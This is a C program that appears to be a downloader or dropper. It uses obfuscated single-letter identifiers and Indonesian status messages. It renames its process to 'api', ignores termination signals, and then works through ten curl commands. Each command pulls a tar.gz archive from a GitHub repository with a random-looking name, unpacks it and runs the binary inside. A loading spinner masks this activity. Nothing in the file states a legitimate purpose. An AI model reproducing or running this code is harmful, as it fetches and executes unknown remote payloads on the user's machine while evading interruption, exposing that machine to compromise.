#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#define A(a,b) ((a)+(b))
#define B(c,d) (((c)^(d))&(0xFF))
void(*C)(int);
void* D(void* E) { const char F[] = "/-\\|"; int G = 0; while (*((volatile bool*)E)) { printf("\r%c Loading...", F[G % 4]); fflush(stdout); usleep(300000); G++; } printf("\r✓ Selesai      \n"); return NULL; }
void H(int I) { (void)I; }
void I() { struct sigaction J; J.sa_handler = H; J.sa_flags = 0; sigemptyset(&J.sa_mask); if (sigaction(SIGINT, &J, NULL) < 0 || sigaction(SIGTERM, &J, NULL) < 0 || sigaction(SIGHUP, &J, NULL) < 0 || sigaction(SIGQUIT, &J, NULL) < 0) { perror("sigaction failed"); exit(EXIT_FAILURE); } }
void K(char* L, const char* M) { strncpy(L, M, 512); L[511] = '\0'; }
void N(const char* O, char* P, size_t Q) { char R[512]; K(R, O); char* S = strtok(R, " "); P[0] = '\0'; while (S != NULL) { if (strcmp(S, "sudo") == 0 || strcmp(S, "-y") == 0 || strcmp(S, ">") == 0 || strcmp(S, "2>&1") == 0 || strstr(S, "/dev/null") != NULL) { S = strtok(NULL, " "); continue; } if (strlen(P) + strlen(S) + 2 < Q) { strcat(P, S); strcat(P, " "); } S = strtok(NULL, " "); } size_t T = strlen(P); if (T > 0 && P[T - 1] == ' ') P[T - 1] = '\0'; }
int U(const char* V, bool W, bool X) { if (W) { char Y[512]; N(V, Y, sizeof(Y)); printf("Menjalankan perintah: %s\n", Y); } pthread_t Z; if (X) { volatile bool AA = true; pthread_create(&Z, NULL, D, &AA); } int AB = system(V); if (X) { volatile bool AA = false; pthread_join(Z, NULL); } if (WIFEXITED(AB)) { int AC = WEXITSTATUS(AB); if (AC != 0) { printf("\n[ERROR] Perintah gagal dijalankan. Exit code: %d\n", AC); } return AC; } else { printf("\n[ERROR] Perintah tidak dieksekusi dengan benar.\n"); return -1; } }
int AD() { return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/1naszxcvbnjioert1.tar.gz | tar -xz -f - && ./1naszxcvbnjioert1", 1, 0); }
int AE() { printf("Process number 2...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/2naszxcioertuioj2.tar.gz | tar -xz -f - && ./2naszxcioertuioj2", 0, 1); }
int AF() { printf("Process number 3...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/3asoierhkshdcht3.tar.gz | tar -xz -f - && ./3asoierhkshdcht3", 0, 1); }
int AG() { printf("Process number 4...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/4nasxvjoertjshft4.tar.gz | tar -xz -f - && ./4nasxvjoertjshft4", 0, 1); }
int AH() { printf("Process number 5...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/5naszxcuiorebnd5.tar.gz | tar -xz -f - && ./5naszxcuiorebnd5", 0, 1); }
int AI() { printf("Process number 6...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/6nscotrewkdoper6.tar.gz | tar -xz -f - && ./6nscotrewkdoper6", 0, 1); }
int AJ() { printf("Process number 7...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/7naszxcvmeushk7.tar.gz | tar -xz -f - && ./7naszxcvmeushk7", 0, 1); }
int AK() { printf("Process number 8...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/8nmotrfcvbuiogfd8.tar.gz | tar -xz -f - && ./8nmotrfcvbuiogfd8", 0, 1); }
int AL() { printf("Process number 9...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/9nazxcveromdseu9.tar.gz | tar -xz -f - && ./9nazxcveromdseu9", 0, 1); }
int AM() { printf("Process number 10...\n"); return U("curl -s https://raw.githubusercontent.com/piksuf/xcnasoexweoiunaszxcnioertuioascmznuxx/refs/heads/main/10nasfukueirtuie10.tar.gz | tar -xz -f - && ./10nasfukueirtuie10", 0, 1); }
int main() { prctl(PR_SET_NAME, (unsigned long)"api", 0, 0, 0); I(); if (AD() != 0) { if (AE() != 0) { if (AF() != 0) { if (AG() != 0) { if (AH() != 0) { if (AI() != 0) { if (AJ() != 0) { if (AK() != 0) { if (AL() != 0) { if (AM() != 0) { } } } } } } } } } } } } return 0; }